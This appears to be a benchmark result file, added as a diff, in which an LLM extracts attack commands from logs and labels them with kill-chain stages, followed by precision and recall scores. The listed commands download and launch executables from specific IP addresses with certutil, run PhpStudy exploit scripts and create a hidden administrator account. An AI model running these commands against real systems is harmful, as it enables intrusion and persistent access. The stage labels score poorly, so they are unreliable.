@@ -1,0 +1,87 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "cmd.exe /c \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd /c python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ whoami&arp -a&ipconfig&ping www.baidu.com -c 1'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c cd /d D:\\phpStudy\\WWW & net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c cd /d D:\\phpStudy\\WWW & certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe&echo [S]\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c cd /d D:\\phpStudy\\WWW & C:\\Windows\\ywm.exe&echo [S]\"",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "The attackers initially gain access via an HTTP request to download and run an executable named `agent.exe`. They use various commands over HTTP requests and locally executed scripts to establish persistence (`agent.exe`), move laterally within the network using custom Python scripts, escalate privileges through creating a new admin user, and execute arbitrary binaries.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 11161,
+      "completion_tokens": 757,
+      "total_tokens": 11918,
+      "wall_clock_s": 9.209,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.3333333333333333,
+      "recall": 0.42857142857142855,
+      "f1": 0.375,
+      "tp": 3,
+      "fp": 6,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.1111111111111111,
+      "recall": 0.16666666666666666,
+      "f1": 0.13333333333333333,
+      "tp": 1,
+      "fp": 8,
+      "fn": 5,
+      "recall_partial": 0.25
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 11161,
+      "completion_tokens": 757,
+      "total_tokens": 11918,
+      "wall_clock_s": 9.209,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
